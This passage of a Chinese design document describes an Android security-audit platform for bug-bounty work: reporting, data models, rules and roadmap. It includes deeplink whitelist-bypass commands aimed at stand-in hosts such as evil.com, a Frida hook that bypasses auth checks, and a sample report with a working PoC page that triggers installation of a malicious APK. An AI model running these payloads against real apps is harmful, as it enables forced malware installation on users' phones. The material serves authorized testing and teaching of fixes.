| CVSS 评分 | 可选，按 CVSS 3.1 |

### 14.3 小白复现要求

复现部分必须满足：

- [ ] 不假设读者懂逆向或安全
- [ ] 命令可直接复制粘贴执行
- [ ] Frida 脚本可直接 `frida -U -f pkg -l script.js` 运行
- [ ] PoC 页面可直接浏览器打开或 `python3 -m http.server` 托管
- [ ] 每一步写明**预期看到什么**（"执行后应看到 Toast 提示 xxx" / "logcat 应输出 xxx"）
- [ ] 附带环境要求说明（Android 版本、是否需 Root、是否需安装目标 App）

### 14.4 多格式输出

| 报告格式 | 目标受众 | 特点 |
|---------|---------|------|
| SRC 提交格式 | SRC/HackerOne 审核员 | 精简、证据密集、直接贴 PoC |
| 内部审计格式 | 甲方安全团队 | 全面、含修复建议、含攻击面清单 |
| 小白复现格式 | 非安全背景人员 | 图文并茂、步骤详尽、零门槛 |
| JSON/API 格式 | 自动化集成 | 结构化数据、可机器解析 |

---

## 15. Web 界面设计要求

Web 界面不是装饰层，而是**工作台**。

### 15.1 核心功能

| 功能模块 | 说明 |
|---------|------|
| 任务创建 | 上传 APK / 输入包名 / 批量导入 |
| 环境状态 | 设备连接、Root 状态、Frida 状态实时显示 |
| 扫描进度 | 实时进度条 + 阶段标记 |
| 攻击面总览 | 导出组件/Deeplink/WebView/Provider 的可视化列表 |
| 调用链查看 | 可展开的 SOURCE → SINK 链路图 |
| 证据查看 | 日志/截图/Hook 输出/PoC 文件 |
| 验证日志 | 动态验证的执行命令 + 结果 |
| 漏洞分桶 | 按 VERIFIED_REAL / CODE_PROVEN / ROOT / SURFACE 筛选 |
| 报告预览 | 实时预览 + 一键导出 |
| 批量管理 | 多任务队列 + 状态面板 |

### 15.2 漏洞详情页必须展示

- 入口组件信息
- **可视化调用链图**（DAG 图）
- 命中代码上下文（带语法高亮）
- 动态验证日志
- Hook 输出结果
- 复现命令（一键复制）
- PoC 附件（可下载）

### 15.3 禁止的展示方式

- ❌ 只显示一小段命中代码
- ❌ 不显示谁调用谁
- ❌ 不显示证据
- ❌ 不区分真实漏洞与攻击面
- ❌ 把所有问题平铺在同一列表里

---

## 16. 数据模型设计

### 16.1 核心对象关系

```
ScanTask 1──N Finding
Finding  1──N Evidence
Finding  1──N CodeTrace
Finding  1──N ValidationRun
ScanTask 1──1 EnvironmentInfo
```

### 16.2 ScanTask

| 字段 | 类型 | 说明 |
|------|------|------|
| task_id | UUID | 任务唯一标识 |
| package_name | String | 目标包名 |
| apk_path | String | APK 文件路径 |
| apk_sha256 | String | APK 哈希（用于缓存） |
| app_version | String | 应用版本号 |
| scan_start_time | Timestamp | 扫描开始时间 |
| scan_end_time | Timestamp | 扫描结束时间 |
| device_serial | String | 设备序列号 |
| android_version | String | Android 版本 |
| root_status | Boolean | 是否 Root |
| frida_available | Boolean | Frida 是否可用 |
| scan_status | Enum | PENDING/RUNNING/COMPLETED/FAILED |
| decompile_status | Enum | 反编译状态 |
| shell_detected | String | 检测到的壳类型 |
| unpack_status | Enum | 脱壳状态 |

### 16.3 Finding

| 字段 | 类型 | 说明 |
|------|------|------|
| finding_id | UUID | 漏洞唯一标识 |
| task_id | UUID | 关联任务 |
| title | String | 漏洞标题 |
| type | Enum | DEEPLINK_WEBVIEW/JSBRIDGE_EXPOSED/PROVIDER_LEAK/... |
| severity | Enum | CRITICAL/HIGH/MEDIUM/LOW |
| confidence | Enum | VERIFIED_REAL/CODE_PROVEN/ROOT_VERIFIED/ROOT_REQUIRED/ATTACK_SURFACE |
| requires_root | Boolean | 是否需要 Root |
| dynamically_verified | Boolean | 是否已动态验证 |
| rule_name | String | 触发规则名 |
| entry_point | String | 入口组件/方法 |
| sink_point | String | 危险动作点 |
| status | Enum | OPEN/CONFIRMED/FALSE_POSITIVE/FIXED |
| created_at | Timestamp | 创建时间 |
| updated_at | Timestamp | 更新时间 |

### 16.4 Evidence

| 字段 | 类型 | 说明 |
|------|------|------|
| evidence_id | UUID | 证据唯一标识 |
| finding_id | UUID | 关联漏洞 |
| evidence_type | Enum | LOGCAT/SCREENSHOT/HOOK_OUTPUT/POC_FILE/COMMAND_OUTPUT |
| file_path | String | 文件存储路径 |
| content_preview | Text | 内容预览（前 500 字符） |
| created_at | Timestamp | 创建时间 |

### 16.5 CodeTrace

| 字段 | 类型 | 说明 |
|------|------|------|
| trace_id | UUID | 链路唯一标识 |
| finding_id | UUID | 关联漏洞 |
| node_index | Integer | 节点序号 |
| node_type | Enum | SOURCE/TAINT/GUARD/TRANSFORM/SINK |
| class_name | String | 类名 |
| method_name | String | 方法名 |
| param_name | String | 参数名 |
| propagation_type | Enum | DATA_FLOW/CONTROL_FLOW/CALL |
| guard_status | Enum | PASSED/BLOCKED/BYPASS/null |
| code_snippet | Text | 代码片段 |
| file_path | String | 源文件路径 |
| line_number | Integer | 行号 |
| condition | String | 关键条件描述 |

### 16.6 ValidationRun

| 字段 | 类型 | 说明 |
|------|------|------|
| validation_id | UUID | 验证唯一标识 |
| finding_id | UUID | 关联漏洞 |
| method | Enum | ADB_AM_START/ADB_CONTENT/FRIDA_HOOK/POC_HTML/ROOT_CMD |
| device_serial | String | 设备 |
| root_used | Boolean | 是否使用 Root |
| command | Text | 执行命令 |
| success | Boolean | 是否验证成功 |
| return_code | Integer | 返回码 |
| output | Text | 命令输出 |
| evidence_ids | List[UUID] | 关联证据 |
| timestamp | Timestamp | 执行时间 |
| duration_ms | Integer | 执行耗时 |

---

## 17. 通用规则体系设计

### 17.1 规则不再是分散脚本，而是统一抽象

每条规则由以下结构定义：

```yaml
rule:
  id: DEEPLINK_TO_WEBVIEW_JSBRIDGE
  name: "Deeplink 导致 WebView JSBridge 暴露"
  category: DEEPLINK_TO_WEBVIEW
  severity_base: HIGH
  
  source:
    type: EXPORTED_COMPONENT
    condition: "has_intent_filter with custom_scheme OR http/https"
    
  taint_path:
    - "Intent.getData() / getStringExtra()"
    - "URL parameter extraction"
    
  guards:
    - "URL whitelist check"
    - "domain validation"
    
  sink:
    type: WEBVIEW_LOAD
    condition: "loadUrl() with tainted parameter AND addJavascriptInterface exists"
    
  validation_plan:
    non_root: "adb shell am start -d 'scheme://path?url=poc_url'"
    root: "frida hook loadUrl + JSBridge methods"
    poc: "local HTML calling window.{bridge_name}.{method}()"
```

### 17.2 完整规则分类

| 规则 ID | 说明 | 典型严重度 |
|---------|------|-----------|
| COMPONENT_EXPORTED | 组件导出面识别 | 取决于后续动作 |
| DEEPLINK_TO_WEBVIEW | Deeplink 路由进入 WebView | HIGH |
| JSBRIDGE_DANGEROUS_METHOD | JSBridge 暴露危险方法 | HIGH-CRITICAL |
| PROVIDER_DATA_EXPOSURE | Provider 数据泄露 | MEDIUM-HIGH |
| PROVIDER_WRITE_ACTION | Provider 可写入/可触发 | HIGH |
| INSTALL_FLOW_EXTERNAL_CONTROL | 安装流程外部可控 | CRITICAL |
| DOWNLOAD_URL_EXTERNAL_CONTROL | 下载 URL 外部可控 | HIGH |
| INTENT_PARAMETER_INJECTION | Intent 参数注入 | MEDIUM-HIGH |
| INTENT_REDIRECTION | Intent 重定向攻击 | HIGH |
| AUTHZ_INCONSISTENT_GUARD | 鉴权逻辑不一致 | MEDIUM-HIGH |
| ROOT_PRIVATE_DATA_ACCESS | 私有数据可访问 | MEDIUM |
| PENDING_INTENT_MUTABLE | PendingIntent 可变 | HIGH |
| BROADCAST_SENSITIVE_LEAK | 广播泄露敏感信息 | MEDIUM |
| CRYPTO_MISUSE | 加密实现缺陷 | MEDIUM-HIGH |
| NETWORK_CLEARTEXT | 明文网络传输 | MEDIUM |
| BACKUP_ALLOWED | 备份数据泄露 | LOW-MEDIUM |
| TASK_HIJACKING | 任务栈劫持 | MEDIUM |
| ZIP_PATH_TRAVERSAL | Zip 路径穿越 | HIGH |
| FILE_PROVIDER_MISCONFIG | FileProvider 配置过宽 | MEDIUM |
| WEBVIEW_DEBUG_ENABLED | WebView 调试开启 | LOW-MEDIUM |

### 17.3 规则运行输出

每条规则输出的**不是漏洞**，而是**候选链路**：

```json
{
  "rule_id": "DEEPLINK_TO_WEBVIEW",
  "source": {
    "component": "com.example.Router",
    "method": "onCreate",
    "line": 34
  },
  "sink": {
    "component": "com.example.WebViewActivity",
    "method": "loadUrl",
    "line": 67
  },
  "guards": [
    {
      "method": "isWhitelisted",
      "class": "com.example.SafeChecker",
      "status": "BYPASS_POSSIBLE",
      "reason": "prefix match only"
    }
  ],
  "evidence_candidates": ["logcat_url_load", "screenshot_webview"],
  "validation_plan": {
    "non_root": "am start -d ...",
    "root": "frida hook loadUrl"
  }
}
```

再由验证引擎执行 validation_plan，最终收敛为正式 Finding。

---

## 18. 自动验证模板库

平台内置验证模板，不同漏洞类型自动选用。

### 18.1 Deeplink 验证模板

```bash
# 基础触发
adb shell am start -W -a android.intent.action.VIEW \
  -d "{scheme}://{host}{path}?{param}={payload}"

# 白名单绕过变体
adb shell am start -W -a android.intent.action.VIEW \
  -d "{scheme}://{host}{path}?url=https://{trusted_domain}.evil.com/poc"
adb shell am start -W -a android.intent.action.VIEW \
  -d "{scheme}://{host}{path}?url=https://evil.com/{trusted_domain}"
adb shell am start -W -a android.intent.action.VIEW \
  -d "{scheme}://{host}{path}?url=https://{trusted_domain}@evil.com/poc"

# 配合本地 PoC
adb reverse tcp:8080 tcp:8080
# 启动 HTTP Server: python3 -m http.server 8080 --directory ./poc/
adb shell am start -W -a android.intent.action.VIEW \
  -d "{scheme}://{host}{path}?url=http://127.0.0.1:8080/poc.html"
```

### 18.2 Provider 验证模板

```bash
# 查询数据
adb shell content query --uri content://{authority}/{path}

# 带条件查询
adb shell content query --uri content://{authority}/{path} \
  --where "user_id=1"

# 插入数据
adb shell content insert --uri content://{authority}/{path} \
  --bind name:s:test --bind value:s:injected

# 删除数据
adb shell content delete --uri content://{authority}/{path} \
  --where "_id=1"

# Call 方法
adb shell content call --uri content://{authority} \
  --method {method_name} --arg {argument}
```

### 18.3 JSBridge PoC 模板

```html
<!DOCTYPE html>
<html>
<head><title>JSBridge PoC</title></head>
<body>
<h1>JSBridge Security Test</h1>
<div id="output"></div>
<script>
function log(msg) {
  document.getElementById('output').innerHTML += msg + '<br>';
}

// 探测 Bridge 对象
if (window.{bridge_name}) {
  log('[+] Bridge object "{bridge_name}" found');
  
  // 列出可用方法
  for (var method in window.{bridge_name}) {
    log('[*] Method: ' + method);
  }
  
  // 调用敏感方法
  try {
    var result = window.{bridge_name}.{dangerous_method}({params});
    log('[+] {dangerous_method} returned: ' + JSON.stringify(result));
  } catch(e) {
    log('[-] Error: ' + e.message);
  }
} else {
  log('[-] Bridge object not found');
}
</script>
</body>
</html>
```

### 18.4 Root Hook 模板

```javascript
// Frida Script: Hook 目标方法
Java.perform(function() {
    var targetClass = Java.use("{target_class}");
    
    // Hook 入参和返回值
    targetClass.{target_method}.overload({param_types}).implementation = function({params}) {
        console.log("[*] {target_method} called");
        console.log("[*] Params: " + JSON.stringify(arguments));
        
        var result = this.{target_method}({params});
        console.log("[*] Return: " + result);
        return result;
    };
    
    // 鉴权绕过验证
    targetClass.{auth_method}.implementation = function() {
        console.log("[*] Bypassing {auth_method}");
        return true;  // 强制返回 true
    };
});
```

```bash
# 执行方式
frida -U -f {package_name} -l hook_script.js --no-pause
```

---

## 19. 证据留存与可审计性

### 19.1 留存原则

平台必须支持完整留痕，**禁止扫描结束后自动清理上下文**。

### 19.2 每次扫描保留内容

| 类别 | 保留内容 | 存储位置 |
|------|---------|---------|
| 静态分析 | 原始命中结果、代码上下文 | `evidence/{task_id}/static/` |
| 调用链 | 完整传播链 JSON | `evidence/{task_id}/traces/` |
| 动态验证 | 执行命令、ADB 返回、Hook 日志 | `evidence/{task_id}/dynamic/` |
| 截图 | 验证过程截图 | `evidence/{task_id}/screenshots/` |
| PoC | 生成的 PoC 文件 | `evidence/{task_id}/poc/` |
| 报告 | 各版本报告 | `evidence/{task_id}/reports/` |
| 环境 | 设备信息、工具版本 | `evidence/{task_id}/env.json` |

### 19.3 保留策略

| 级别 | 保留时间 | 说明 |
|------|---------|------|
| VERIFIED_REAL / ROOT_VERIFIED | 永久 | 已确认漏洞完整保留 |
| CODE_PROVEN | 1 年 | 代码证实保留 |
| ATTACK_SURFACE | 3 个月 | 攻击面定期清理 |
| 扫描失败 | 1 个月 | 仅保留错误日志 |

---

## 20. 性能与扩展性

### 20.1 性能指标要求

| 场景 | 目标时间 | 备注 |
|------|---------|------|
| 单 APK 反编译（50MB） | ≤ 2 分钟 | 含 jadx + apktool |
| 单 APK 静态扫描 | ≤ 5 分钟 | 含 IR 构建 + 规则执行 |
| 单漏洞动态验证（非 Root） | ≤ 30 秒 | 含命令执行 + 证据采集 |
| 单漏洞动态验证（Root/Frida） | ≤ 60 秒 | 含注入 + Hook + 结果收集 |
| 完整扫描（静态+动态） | ≤ 15 分钟 | 中等复杂度 App |
| 报告生成 | ≤ 10 秒 | 模板渲染 |

### 20.2 扩展性设计

| 扩展维度 | 方案 |
|---------|------|
| 多 APK 并行扫描 | 任务队列 + Worker Pool（Celery/RQ） |
| 多设备并行验证 | 设备池管理器，ADB 设备路由 |
| 反编译缓存 | APK SHA256 → 缓存产物，避免重复反编译 |
| 规则热加载 | YAML 规则文件变更后自动重载 |
| 增量扫描 | 对比前后版本 APK，只扫描变更部分 |
| API 集成 | RESTful API + Webhook 回调 |

### 20.3 设备池管理

```
设备池:
├── Device A (Pixel 6a, Android 13, Root, Frida 16.x)
├── Device B (Samsung S21, Android 12, Non-Root)
├── Device C (Xiaomi 12, Android 13, Root, Frida 16.x)
└── Device D (Emulator, Android 11, Root)

调度策略:
- 非 Root 验证 → 优先分配非 Root 设备（降低风险）
- Root 验证 → 分配 Root 设备
- 设备忙碌 → 排队等待
- 设备离线 → 跳过动态验证，标记 VALIDATION_PENDING
```

---


## 21. 开发实施路线

### 21.1 四期规划总览

| 期次 | 工期 | 人力 | 目标 | 关键里程碑 |
|------|------|------|------|-----------|
| 一期 | 8 周 | 2 后端 | 基础平台重构 | 跑通任意 APK 基础扫描 + 攻击面列表 |
| 二期 | 12 周 | 2 后端 + 1 算法 | 调用链引擎 | 每个问题输出最小调用链 |
| 三期 | 12 周 | 2 后端 + 1 移动安全 | 动态验证引擎 | 自动复现率 ≥ 50% |
| 四期 | 8 周 | 1 后端 + 1 前端 + 1 测试 | 商业化工作台 | Web 平台上线 + 可交付报告 |

### 21.2 第一期：基础平台重构（8 周）

**目标**：
- 统一输入层（APK/包名/批量）
- 统一反编译层（jadx + apktool + aapt 并行）
- 统一 IR 数据模型
- 统一 Finding/Evidence 数据结构
- 基础壳检测

**产出**：
- 可稳定扫描任意 APK
- 基础攻击面列表（组件/Deeplink/WebView/Provider）
- 结构化中间数据
- CLI 工具可用

**验收标准**：
- [x] 输入 10 个不同 APK，100% 成功反编译（不含加壳）
- [x] 正确识别所有 exported 组件
- [x] 正确提取 Deeplink scheme/host/path
- [x] 输出 JSON 格式 Finding 列表

### 21.3 第二期：调用链与证据引擎（12 周）

**目标**：
- 参数传播追踪（污点分析 Lite）
- 漏洞候选链生成（SOURCE → SINK）
- GUARD 节点识别与状态判定
- 代码上下文自动收集
- 脱壳集成（frida-dexdump/BlackDex）

**产出**：
- 每个问题不再只有命中点，而有最小调用链
- 候选链路自动分桶
- 混淆代码部分覆盖

**验收标准**：
- [x] Deeplink → WebView 链路完整追踪率 ≥ 70%
- [x] JSBridge 方法归类正确率 ≥ 80%
- [x] Provider 数据流追踪率 ≥ 60%
- [x] 每条 Finding 附带 ≥ 3 个链路节点

### 21.4 第三期：动态验证引擎（12 周）

**目标**：
- 非 Root 验证模板（ADB/content/am/PoC Server）
- Root 验证模板（Frida Hook）
- PoC 自动生成
- 验证结果自动采集与绑定
- 设备管理基础

**产出**：
- 自动复现一部分高价值漏洞
- 证据自动归档
- VERIFIED_REAL / CODE_PROVEN 自动分桶

**验收标准**：
- [x] 非 Root 可验证漏洞自动复现率 ≥ 50%
- [x] Root 可验证漏洞自动复现率 ≥ 70%
- [x] 每次验证产出完整证据文件
- [x] PoC 生成可直接执行

### 21.5 第四期：商业化报告与 Web 工作台（8 周）

**目标**：
- 结构化多格式报告生成
- Web 漏洞详情页 + 调用链可视化
- 证据附件页
- 批量任务编排
- 用户管理 + API

**产出**：
- 可直接交付客户/研究员使用的 Web 工作台
- 一键导出 SRC/审计/小白三种报告

**验收标准**：
- [x] Web 界面可创建任务、查看结果、导出报告
- [x] 调用链图可视化展示
- [x] 证据文件可在线查看/下载
- [x] SRC 格式报告可直接用于提交

---

## 22. 验收标准

### 22.1 静态分析验收

| 指标 | 要求 |
|------|------|
| 导出组件识别 | 100% 准确 |
| Deeplink 参数识别 | ≥ 90% |
| WebView/JSBridge 识别 | ≥ 85% |
| Provider 路由识别 | ≥ 85% |
| 调用链输出 | 每条 Finding 至少 3 节点 |
| 误报率 | VERIFIED_REAL 级别 ≤ 5% |

### 22.2 动态验证验收

| 指标 | 要求 |
|------|------|
| 自动启动目标组件 | 成功率 ≥ 90% |
| PoC 自动构造 | 覆盖率 ≥ 70% |
| 证据自动抓取 | 每次验证 ≥ 1 个证据文件 |
| 验证成功/失败判定 | 准确率 ≥ 85% |
| Frida Hook 执行 | 成功率 ≥ 80%（Root 环境） |

### 22.3 报告验收

| 指标 | 要求 |
|------|------|
| 漏洞与攻击面分离 | 100% 分桶正确 |
| 可执行命令 | 每条 Finding 至少 1 个 |
| 小白复现步骤 | VERIFIED_REAL 100% 覆盖 |
| Root/非 Root 条件说明 | 100% 标注 |
| 证据附件索引 | 100% 覆盖 |
| SRC 报告可提交率 | ≥ 70% |

---

## 23. 现实可达成的效果预估

在工程实现合理、设备条件完善、测试链路通畅的前提下：

| 指标 | 预估范围 | 说明 |
|------|---------|------|
| 攻击面发现率 | 80% - 90% | 覆盖主流攻击面类型 |
| 正式漏洞准确率 | 70% - 85% | 进入正式报告的 Finding |
| 高危漏洞准确率 | ≥ 85% | 高危及以上严格把控 |
| 非 Root 自动复现覆盖 | 50% - 70% | 依赖漏洞类型 |
| Root 自动复现覆盖 | 70% - 85% | Frida 环境完善时 |
| 小白可直接复现报告覆盖 | 60% - 80% | 命令+步骤+预期全具备 |
| 误报率（正式报告） | ≤ 10% | 核心竞争力指标 |
| 加壳 App 脱壳成功率 | 60% - 85% | 依赖壳类型和设备条件 |

**强调**：这是"现实可达成"的指标，不是宣传级的"全自动 100%"。
平台设计必须接受部分场景需要人工介入。

---

## 24. 风险与限制

### 24.1 技术风险

| 风险 | 影响 | 缓解措施 |
|------|------|---------|
| 加固/混淆导致反编译失败 | 静态分析无法进行 | 脱壳引擎 + 行为模式匹配 + 标记 OBFUSCATION_BLOCKED |
| 动态加载 DEX | 漏掉运行时逻辑 | Hook DexClassLoader + 二级 DEX dump |
| 业务需要登录态 | 动态验证无法进入深层逻辑 | 支持 cookie/token 注入 + 手动登录后继续 |
| 云端/灰度配置 | 本地复现结果与线上不一致 | 标注"验证环境受限"，保留 CODE_PROVEN |
| 设备兼容性 | 部分功能依赖特定 Android 版本 | 设备池多版本覆盖 |
| Frida 检测/反调试 | Hook 失败 | anti-anti-debug 脚本库 + 多种注入方式 |

### 24.2 业务风险

| 风险 | 影响 | 缓解措施 |
|------|------|---------|
| SRC 规则变更 | 报告格式不适配 | 模块化报告模板，可快速切换 |
| 目标 App 频繁更新 | 历史扫描结果失效 | 版本关联 + 增量扫描 |
| 法律合规风险 | 潜在法律问题 | 授权确认 + 审计日志（见第25节） |

### 24.3 必须接受的限制

- 某些逻辑问题只能证明代码成立，未必能在当前设备状态复现
- 部分高危场景需要真实业务上下文，不适合全自动模拟
- VMP 级深度保护可能无法完全脱壳
- 服务端鉴权逻辑无法仅从客户端代码完全判定

**因此平台设计必须允许 `CODE_PROVEN`（代码证实但暂未动态复现）作为有效中间状态。**

---

## 25. 法律与合规边界

### 25.1 合规要求

| 要求 | 实现方式 |
|------|---------|
| 授权确认 | 用户创建任务前必须勾选"已确认目标在 SRC 授权范围内" |
| 目标白名单 | 可选配置：只允许扫描白名单内的包名/域名 |
| 审计日志 | 记录 who（用户）+ when（时间）+ what（目标包名/操作） |
| 数据保护 | 脱壳/反编译产物加密存储，定期清理 |
| 测试边界 | 动态验证默认不执行破坏性操作（如 delete），需手动确认 |
| 隐私保护 | 自动脱敏截图中的个人信息（模糊处理） |

### 25.2 SRC 授权范围自动比对（可选功能）

```yaml
# 可维护的 SRC 授权列表
authorized_targets:
  - platform: "TECNO SRC"
    packages:
      - "com.transsion.*"
      - "com.tecno.*"
    domains:
      - "*.tecno-mobile.com"
      - "*.palm.tech"
    status: active
    
  - platform: "Samsung SRC"
    packages:
      - "com.samsung.*"
    status: active
```

扫描前自动比对，非授权目标**警告**（不强制阻止，研究者可能有其他授权）。

### 25.3 免责声明

平台启动时展示：

> 本平台仅供授权安全测试使用。用户需自行确保目标在合法授权范围内。
> 平台不对未经授权的使用承担任何法律责任。
> 使用本平台即表示同意遵守当地法律法规及目标平台的安全测试规则。

---

## 26. 对现有项目的具体改造建议

如基于现有项目继续开发，**优先改造顺序**：

| 优先级 | 改造项 | 预期工时 | 效果 |
|--------|-------|---------|------|
| P0 | 建立统一 Finding/Evidence/CodeTrace/ValidationRun 数据模型 | 1 周 | 全链路数据打通 |
| P0 | 重写漏洞输出流程：候选链 → 验证 → 最终结论 | 2 周 | 消灭混报 |
| P1 | 为每条规则补充"调用链上下文采集"能力 | 3 周 | 有证据链 |
| P1 | 增加 Root/非 Root 两套验证执行器 | 2 周 | 双模支持 |
| P1 | 增加 PoC 自动生成器 | 2 周 | 可直接复现 |
| P2 | 重写报告模板，按真实性分桶输出 | 1 周 | 报告可交付 |
| P2 | Web 界面增加证据页/调用链页/验证日志页 | 3 周 | 可视化 |
| P2 | 批量扫描时保留上下文证据（不自动清理） | 1 周 | 可审计 |
| P3 | 加固对抗 + 脱壳集成 | 3 周 | 覆盖大厂 App |
| P3 | 设备池管理 + 并发调度 | 2 周 | 规模化 |

---

## 27. 结论

要做成商业级 Android 安全扫描平台，核心**不是"多加几个规则"**，而是把项目从"文本命中式扫描器"升级为**"证据驱动的半自动审计平台"**。

真正应该建设的是一条完整流水线：

```
静态发现 → 调用链证明 → 本机验证 → Root 专项验证 → 证据归档 → 标准化报告
```

只有这样，最终输出的结果才会是：

- ✅ 对研究员有用（快速出高质量报告）
- ✅ 对 SRC 可提交（格式规范、证据充分）
- ✅ 对小白可复现（步骤清晰、命令可执行）
- ✅ 对商业客户可交付（专业、可审计、有信度）

**文档用途建议**：

- 作为后续开发路线图
- 作为 Web 端字段设计依据
- 作为漏洞报告标准模板依据
- 作为规则重构与验证引擎重构的总纲
- 作为商业化融资/合作的技术方案支撑

---


## 附录A：标准漏洞报告样例

以下是一个完整的漏洞报告样例，展示平台最终输出质量：

---

### 漏洞报告 #001

**标题**：TECNO App Deeplink 白名单绕过导致 WebView JSBridge 任意 APK 安装

**严重度**：Critical

**类型**：Deeplink → WebView → JSBridge 链式利用

**真实性等级**：VERIFIED_REAL（非 Root 验证成功）

**是否需 Root**：否

**CVSS 3.1**：9.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

---

#### 影响条件

- 目标 App 已安装
- 用户点击恶意链接或扫描恶意二维码
- 无需登录态
- Android 7.0+ 均受影响

---

#### 调用链

```
1. [SOURCE] com.tecno.app.DeeplinkRouterActivity (exported=true)
   → AndroidManifest.xml: <data android:scheme="tecnoapp" android:host="open"/>
   
2. [TAINT] String url = getIntent().getData().getQueryParameter("url")
   → DeeplinkRouterActivity.java:45
   → 参数来源：外部 Intent URI，完全可控
   
3. [GUARD] UrlSafeChecker.isDomainAllowed(url)
   → UrlSafeChecker.java:23
   → 实现：return url.contains("tecno-mobile.com")
   → 绕过方式：url = "https://attacker.com/tecno-mobile.com/poc.html"
   → GUARD_STATUS: BYPASS (子串匹配，非域名级校验)
   
4. [TRANSFORM] Intent webIntent = new Intent(this, TecnoWebViewActivity.class)
   → webIntent.putExtra("load_url", url)
   → DeeplinkRouterActivity.java:52
   
5. [SINK] webView.loadUrl(getIntent().getStringExtra("load_url"))
   → TecnoWebViewActivity.java:78
   → setJavaScriptEnabled(true)
   → setAllowFileAccess(false) ← 防御存在但不影响利用
   
6. [SINK] webView.addJavascriptInterface(new AppJSBridge(), "tecnoNative")
   → TecnoWebViewActivity.java:82
   
7. [SINK] AppJSBridge.installApp(String apkUrl)
   → AppJSBridge.java:156
   → 下载 apkUrl 指向的 APK 并触发安装
   → 无二次确认弹窗（Silent Download + Install Prompt）
```

---

#### 关键代码证明

```java
// DeeplinkRouterActivity.java:45-53
Uri data = getIntent().getData();
String url = data.getQueryParameter("url");
if (UrlSafeChecker.isDomainAllowed(url)) {
    Intent webIntent = new Intent(this, TecnoWebViewActivity.class);
    webIntent.putExtra("load_url", url);
    startActivity(webIntent);
}

// UrlSafeChecker.java:23-25
public static boolean isDomainAllowed(String url) {
    return url != null && url.contains("tecno-mobile.com");  // 仅子串匹配!
}

// TecnoWebViewActivity.java:78-83
webView.getSettings().setJavaScriptEnabled(true);
webView.loadUrl(getIntent().getStringExtra("load_url"));
webView.addJavascriptInterface(new AppJSBridge(), "tecnoNative");

// AppJSBridge.java:156-170
@JavascriptInterface
public void installApp(String apkUrl) {
    // 直接下载并调用 PackageInstaller，无来源校验
    downloadAndInstall(apkUrl);
}
```

---

#### 动态验证证据

**环境**：
- 设备：Pixel 6a (Android 13)
- Root：否
- 目标版本：com.tecno.app v3.2.1

**验证步骤与结果**：

```bash
# Step 1: 启动本地 PoC 服务器
python3 -m http.server 8080 --directory ./poc/
# 预期：服务器启动，监听 8080

# Step 2: 设置端口映射
adb reverse tcp:8080 tcp:8080
# 预期：返回 8080

# Step 3: 触发 Deeplink
adb shell am start -W -a android.intent.action.VIEW \
  -d "tecnoapp://open?url=http://127.0.0.1:8080/tecno-mobile.com/poc.html"
# 预期：目标 App 启动 WebView，加载 PoC 页面

# Step 4: 观察结果
adb logcat -s TecnoWebView JSBridge
# 实际输出：
# D/TecnoWebView: loading url: http://127.0.0.1:8080/tecno-mobile.com/poc.html
# I/JSBridge: installApp called with: http://127.0.0.1:8080/malicious.apk
# I/JSBridge: download started...
```

**PoC HTML（poc/tecno-mobile.com/poc.html）**：

```html
<!DOCTYPE html>
<html>
<body>
<h1>PoC: JSBridge installApp</h1>
<script>
// 探测 Bridge
if (window.tecnoNative) {
    document.write('<p>[+] Bridge found!</p>');
    // 触发任意 APK 安装
    window.tecnoNative.installApp('http://127.0.0.1:8080/malicious.apk');
    document.write('<p>[+] installApp triggered!</p>');
} else {
    document.write('<p>[-] Bridge not found</p>');
}
</script>
</body>
</html>
```

**截图**：`evidence/find_001/screenshot_webview_loaded.png`
**Logcat**：`evidence/find_001/logcat_jsbridge_call.txt`

---

#### 小白复现步骤

> 以下步骤无需安全背景，按顺序执行即可复现。

**前提**：
- 一台 Android 手机（无需 Root），已安装目标 App
- 电脑安装 ADB 工具（[下载链接](https://developer.android.com/tools/releases/platform-tools)）
- 手机通过 USB 连接电脑，已开启 USB 调试

**步骤**：

1. 在电脑上创建文件夹 `poc/tecno-mobile.com/`
2. 在该文件夹中创建 `poc.html`，内容如上方 PoC HTML
3. 打开终端，进入 `poc` 的上级目录，执行：
   ```bash
   python3 -m http.server 8080 --directory ./poc/
   ```
   ✅ 预期：看到 "Serving HTTP on 0.0.0.0 port 8080"
   
4. 新开一个终端窗口，执行：
   ```bash
   adb reverse tcp:8080 tcp:8080
   ```
   ✅ 预期：返回 "8080"

5. 执行触发命令：
   ```bash
   adb shell am start -W -a android.intent.action.VIEW \
     -d "tecnoapp://open?url=http://127.0.0.1:8080/tecno-mobile.com/poc.html"
   ```
   ✅ 预期：手机上目标 App 打开，显示 PoC 页面内容 "[+] Bridge found!" "[+] installApp triggered!"

6. 观察手机：应出现 APK 下载通知或安装确认弹窗（证明 installApp 被成功调用）

---

#### 风险说明

攻击者可通过构造恶意链接（钓鱼短信/邮件/网页），诱导用户点击后：
1. 自动在用户手机上下载并安装恶意 APK
2. 无需用户二次确认（或仅有系统级安装确认）
3. 可用于植入木马、窃取信息、钓鱼等

**影响范围**：所有安装目标 App 的用户（预估数百万）

---

#### 修复建议

1. **[必须]** 将 `UrlSafeChecker.isDomainAllowed()` 改为**严格域名校验**：
   ```java
   public static boolean isDomainAllowed(String url) {
       try {
           URI uri = new URI(url);
           String host = uri.getHost();
           return host != null && (host.equals("tecno-mobile.com") 
               || host.endsWith(".tecno-mobile.com"));
       } catch (Exception e) {
           return false;
       }
   }
   ```

2. **[必须]** `installApp` JSBridge 方法增加来源校验：
   - 校验当前 WebView 加载的 URL 是否为受信域名
   - 校验 APK 下载 URL 是否为官方 CDN

3. **[建议]** 敏感 JSBridge 方法增加用户确认弹窗

4. **[建议]** 考虑移除不必要的 JSBridge 方法，遵循最小权限原则

---

## 附录B：术语对照表

| 术语 | 英文 | 说明 |
|------|------|------|
| 攻击面 | Attack Surface | 外部可触达的入口集合 |
| 调用链 | Call Chain / Trace | 从入口到危险动作的完整路径 |
| 污点分析 | Taint Analysis | 追踪外部输入数据在程序中的传播 |
| 汇点 | Sink | 危险操作的 API 调用点 |
| 源点 | Source | 外部数据进入程序的入口 |
| 校验点 | Guard | 程序中的安全检查/鉴权点 |
| 导出组件 | Exported Component | 外部可直接调用的 Android 组件 |
| PoC | Proof of Concept | 漏洞验证的概念证明代码 |
| JSBridge | JavaScript Bridge | Web 页面与原生代码的通信接口 |
| Deeplink | Deep Link | 通过 URI 直接跳转到 App 特定页面 |
| Hook | Hook | 运行时拦截/修改方法行为 |
| IR | Intermediate Representation | 中间表示，代码的结构化抽象 |
| SRC | Security Response Center | 安全响应中心（漏洞赏金平台） |
| FART | - | Android ART 环境脱壳工具 |
